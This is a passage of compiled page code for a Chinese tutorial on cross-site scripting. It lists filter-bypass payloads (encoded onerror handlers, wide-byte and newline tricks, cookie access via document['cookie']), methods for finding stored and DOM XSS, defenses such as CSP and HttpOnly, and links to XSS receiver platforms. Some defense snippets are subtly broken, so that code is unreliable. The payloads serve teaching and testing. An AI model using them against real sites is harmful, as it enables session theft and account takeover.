"),a("p",[a("strong",[s._v("Unicode转义")])]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("a\\"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("u006cert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如果能够使用eval命令，就能够将其它命令以字符串的格式传送给eval，从而执行其它 命令。")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("eval")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'a\\u006cert(1)'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("替代圆点")])]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'cookie'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("with")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("没有过滤&和#")])]),s._v(" "),a("div",{staticClass:"language-在 HTML 属性中，会自动对实体字符进行转义。一个简单的比方。 line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<img src="1" onerror="alert(1)">\n和\n<img src="1" onerror="alert&#x28;1&#x29;">\n\n是等效的\n\npyload\n<img src="1" onerror="alert&#x28;1&#x29;">\n还可以将上面pyload进行url编码\n<img src="1" onerror="alert%26%23x28%3b1%26%23x29%3b">\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[a("strong",[s._v("宽字节绕过")])]),s._v(" "),a("div",{staticClass:"language-利用前提<meta>标签中有如下内容 line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />\n\npyload\n<img src="1%c0%22 onerror="alert%26%23x28%3b1%26%23x29%3b">\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("em",[a("strong",[s._v("反斜线绕过")])])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('需要能够传两个参数，一个用反斜杠过滤双引号，一个用来写入js代码\nlocation.href="127.0.0.1/?"+"ss=aaaa\\"+"&from==1;alert(1);function/**/from(){}//\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("em",[a("strong",[s._v("换行符绕过")])])]),s._v(" "),a("div",{staticClass:"language-只有在注释中输出内容才能使用 line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("示例：\n//这是注释\n//这是注释{参数}\n{参数}=alert(1)\n//这是注释\n//这是注释alert(1)\n在注释中无法执行\n使用%0a用来跳过单行注释{参数}=%0alert(1)\n//这是注释\n//这是注释\nalert(1)\n利用换行在第二行注释中换了行，导致单行注释//没有注释到alert(1)\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("h2",{attrs:{id:"查找利用存储型xss"}},[s._v("查找利用存储型XSS "),a("a",{staticClass:"header-anchor",attrs:{href:"#查找利用存储型xss"}},[s._v("#")])]),s._v(" "),a("p",[s._v("确定保存型XSS漏洞的过程与前面描述的确定反射型XSS漏洞的过程类似。")]),s._v(" "),a("p",[s._v("但是，这两个过程之间也存在一些重要的区别；")]),s._v(" "),a("p",[s._v("在进行测试时必须记住这些区别，以确定尽可能多的漏洞。")]),s._v(" "),a("blockquote",[a("p",[s._v("(1) 向应用程序的每一个可能的位置提交一个特殊字符串后，必须反复检查应用程序的全部内容与功能；")]),s._v(" "),a("p",[s._v("(2) 如有可能，应检查管理员能够访问的区域，确定其中是否有可以被非管理用户控制的数据；")]),s._v(" "),a("p",[s._v("​      比如有些应用可以在浏览器查看日志，攻击者可留下恶意的HTML日志加以利用；")]),s._v(" "),a("p",[s._v("(3) 检查应用的整个流程，确保测试彻底，检查任何可控的带外通道，如HTTP消息头；")])]),s._v(" "),a("p",[a("strong",[s._v("在上传文件中测试XSS")])]),s._v(" "),a("p",[s._v("如果应用程序允许用户上传可被其它用户查看下载的文件，就会出现保存型XSS，这种漏洞常被人们忽略。")]),s._v(" "),a("p",[s._v("测试时，首先上传一个验证性的HTML文件。")]),s._v(" "),a("p",[s._v("如果该文件被接受，则尝试以正常方式下载该文件。")]),s._v(" "),a("p",[s._v("如果应用程序按照原样返回最初的文件，并且脚本被执行，则应用肯定易于受到攻击。")]),s._v(" "),a("p",[s._v("**例：**可把XSS的payload做成图片木马，上传到用户头像(用各种方法去绕过上传限制)")]),s._v(" "),a("h2",{attrs:{id:"查找并利用dom型的xss漏洞"}},[s._v("查找并利用DOM型的XSS漏洞 "),a("a",{staticClass:"header-anchor",attrs:{href:"#查找并利用dom型的xss漏洞"}},[s._v("#")])]),s._v(" "),a("p",[s._v("确定基于DOM型的XSS漏洞，一种有效的方法是，检查所有客户端JavaScript，")]),s._v(" "),a("p",[s._v("看其中是否使用任何可能会导致漏洞的DOM属性。")]),s._v(" "),a("p",[s._v("工具"),a("a",{attrs:{href:"https://www.blueinfy.com/#DOMTracer",target:"_blank",rel:"noopener noreferrer"}},[s._v("DOMTracer"),a("OutboundLink")],1),s._v("可自动完成这个测试过程。")]),s._v(" "),a("p",[s._v("检查每一段客户端JavaScript，看其中是否出现以下API")]),s._v(" "),a("p",[s._v("它们可用于访问通过一个专门设计的URL控制的DOM数据；")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[s._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("location\n document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("URL")]),s._v("\n document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("URLUnencoded\n document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("referrer\n window"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("location\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("在每一个使用上述API的位置，仔细检查那里的代码，确定应用程序如何处理用户可控的数据；")]),s._v(" "),a("p",[s._v("以及是否可以使用专门设计的输入来执行JavaScript。")]),s._v(" "),a("p",[s._v("尤其注意检查并测试控制的数据被传送至以下任何一个API的情况")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("writeln")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("body"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("innerHtml\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("eval")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nwindow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("execScript")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nwindow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("setInterval")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nwindow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("setTimeout")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("片段技巧：服务器不解析url中#后的内容")]),s._v(" "),a("p",[a("strong",[s._v("更多实战例子文章可见 plat.wgpsec.org")])]),s._v(" "),a("h1",{attrs:{id:"防止xss攻击"}},[s._v("防止XSS攻击 "),a("a",{staticClass:"header-anchor",attrs:{href:"#防止xss攻击"}},[s._v("#")])]),s._v(" "),a("h2",{attrs:{id:"防止反射型与存储型xss"}},[s._v("防止反射型与存储型XSS "),a("a",{staticClass:"header-anchor",attrs:{href:"#防止反射型与存储型xss"}},[s._v("#")])]),s._v(" "),a("p",[s._v("用户可控的数据未经适当的确认与净化就被复制到应用程序响应中，这是造成反射型与保存型XSS漏洞的根本原因")]),s._v(" "),a("p",[a("strong",[s._v("1.确认输入")])]),s._v(" "),a("blockquote",[a("p",[s._v("数据不能太长")]),s._v(" "),a("p",[s._v("数据仅包含某组合法字符")]),s._v(" "),a("p",[s._v("数据与一个特殊的正则表达式相匹配")])]),s._v(" "),a("p",[s._v("根据应用程序希望在字段中收到的数据类型，应尽可能的限制性的对姓名、电子邮件地址、账号等")]),s._v(" "),a("p",[s._v("应用不同的确认规则。")]),s._v(" "),a("p",[a("strong",[s._v("2.确认输出")])]),s._v(" "),a("p",[s._v("如果应用程序将某位用户或第三方提交的数据复制到它的响应中，应对这些数据进行HTML编码，净化恶意代码。")]),s._v(" "),a("p",[a("strong",[s._v("3.消除危险插入点")])]),s._v(" "),a("p",[s._v("应尽量避免直接在现有的JavaScript中插入用户可控的数据；")]),s._v(" "),a("p",[s._v("如果标签属性接受URL作为它的值，应避免嵌入用户的输入；")]),s._v(" "),a("p",[a("strong",[s._v("4.允许有限的HTML")])]),s._v(" "),a("p",[s._v("一些应用程序允许用户以HTML格式提交即将插入到应用程序响应中的数据。")]),s._v(" "),a("p",[s._v("例如博客、论坛的富文本编辑器允许使用HTML书写。")]),s._v(" "),a("p",[s._v("有各种框架(如OWASP AntiSamy项目)可用于确认用户提交的HTML标记，以确保其中未包含任何执行JavaScript的方法。")]),s._v(" "),a("h2",{attrs:{id:"防止基于dom的xss漏洞"}},[s._v("防止基于DOM的XSS漏洞 "),a("a",{staticClass:"header-anchor",attrs:{href:"#防止基于dom的xss漏洞"}},[s._v("#")])]),s._v(" "),a("p",[s._v("造成这种漏洞并无法不需要将用户可控的数据复制到服务器响应中，所以上述防范方法对DOM型XSS无用；")]),s._v(" "),a("p",[s._v("应用程序应尽量避免使用客户端脚本处理DOM数据并把它插入到页面中；")]),s._v(" "),a("p",[s._v("如果无法避免，应使用以下两种方法防御DOM型XSS攻击。")]),s._v(" "),a("p",[a("strong",[s._v("1.确认输入")])]),s._v(" "),a("p",[s._v("客户端，确认将要插入到文档中的数据仅包含字母数字与空白符")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" a "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("URL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    a "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("substring")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("indexOf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"message="')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("length"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    a "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unescape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" regex"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[s._v("^(A-Za-z0-9+\\s)*$")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[s._v("/")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("regex"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("test")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("服务端，对URL数据进行严格确认")]),s._v(" "),a("blockquote",[a("p",[s._v("查询字符串中只有一个参数")]),s._v(" "),a("p",[s._v("参数名大小写检查")]),s._v(" "),a("p",[s._v("参数值仅包含数字字母")])]),s._v(" "),a("p",[a("strong",[s._v("2.确认输出")])]),s._v(" "),a("p",[s._v("在将用户可控的DOM数据插入到文档之前，进行HTML编码")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("php\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("reinit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[s._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" d "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("createElement")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'div'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        d"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("appendChild")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("createTextNode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" d"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("innerHTML"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h2",{attrs:{id:"其他-xss-防范措施"}},[s._v("其他 XSS 防范措施 "),a("a",{staticClass:"header-anchor",attrs:{href:"#其他-xss-防范措施"}},[s._v("#")])]),s._v(" "),a("p",[s._v("介绍一些通用的方案，可以降低 XSS 带来的风险和后果。")]),s._v(" "),a("p",[a("strong",[s._v("Content Security Policy")])]),s._v(" "),a("p",[s._v("严格的 CSP 在 XSS 的防范中可以起到以下的作用：")]),s._v(" "),a("blockquote",[a("p",[s._v("禁止加载外域代码，防止复杂的攻击逻辑。")]),s._v(" "),a("p",[s._v("禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。")]),s._v(" "),a("p",[s._v("禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。")]),s._v(" "),a("p",[s._v("禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。")]),s._v(" "),a("p",[s._v("合理使用上报可以及时发现 XSS，利于尽快修复问题。")])]),s._v(" "),a("p",[a("strong",[s._v("输入内容长度控制")])]),s._v(" "),a("p",[s._v("对于不受信任的输入，都应该限定一个合理的长度。")]),s._v(" "),a("p",[s._v("虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。")]),s._v(" "),a("p",[a("strong",[s._v("HTTP-only")])]),s._v(" "),a("p",[s._v("HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。")]),s._v(" "),a("p",[s._v("验证码：防止脚本冒充用户提交危险操作。")]),s._v(" "),a("h1",{attrs:{id:"xss工具"}},[s._v("xss工具 "),a("a",{staticClass:"header-anchor",attrs:{href:"#xss工具"}},[s._v("#")])]),s._v(" "),a("p",[s._v("XSS前端编码：https://github.com/evilcos/xssor2")]),s._v(" "),a("p",[s._v("XSS平台： https://github.com/trysec/BlueLotus_XSSReceiver")]),s._v(" "),a("p",[s._v("Xss-cheat-sheet： https://portswigger.net/web-security/cross-site-scripting/cheat-sheet")]),s._v(" "),a("p",[a("strong",[s._v("XSS_Fuzz")])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"left"}},[s._v("官网")]),s._v(" "),a("th",{staticStyle:{"text-align":"left"}},[s._v("软件对应科普文")])])]),s._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("a",{attrs:{href:"https://github.com/ym2011/PEST/tree/master/BruteXSS",target:"_blank",rel:"noopener noreferrer"}},[s._v("BruteXSS"),a("OutboundLink")],1)]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[a("a",{attrs:{href:"https://www.freebuf.com/sectool/109239.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("Freebuf相关科普"),a("OutboundLink")],1),s._v(" "),a("a",{attrs:{href:"https://www.cnblogs.com/Pitcoft/p/6341322.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("汉化版"),a("OutboundLink")],1)])]),s._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("a",{attrs:{href:"https://github.com/bsmali4/xssfork",target:"_blank",rel:"noopener noreferrer"}},[s._v("XSSfrok"),a("OutboundLink")],1)]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[a("a",{attrs:{href:"https://paper.seebug.org/359/#xssfork",target:"_blank",rel:"noopener noreferrer"}},[s._v("Seebug作者教程"),a("OutboundLink")],1)])])])]),s._v(" "),a("p",[a("strong",[s._v("在线XSS平台")])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("名称")]),s._v(" "),a("th",[s._v("地址")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[s._v("XSS SB")]),s._v(" "),a("td",[s._v("https://xs.sb/")])]),s._v(" "),a("tr",[a("td",[s._v("XSS PT")]),s._v(" "),a("td",[s._v("https://xss.pt/")])])])]),s._v(" "),a("p",[a("strong",[s._v("自建XSS平台")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("https://github.com/firesunCN/BlueLotus_XSSReceiver")])]),s._v(" "),a("li",[a("p",[s._v("https://github.com/mandatoryprogrammer/xsshunter")])])]),s._v(" "),a("p",[a("strong",[s._v("如何快速发现 xss 位置 ？")])]),s._v(" "),a("p",[s._v("对于反射型"),a("code",[s._v("XSS")]),s._v("：")]),s._v(" "),a("p",[s._v("一般来说就是找输入点的可控参数，比如搜索框、留言板、 登录 / 注册，构造payload发送，监控响应")]),s._v(" "),a("p",[s._v("上边这种方法不适用于DOM型"),a("code",[s._v("XSS")]),s._v("，因为 基于DOM的"),a("code",[s._v("XSS")]),s._v("漏洞 ， payload并不在服务器的响应中返回，而是保存在浏览器的DOM中")]),s._v(" 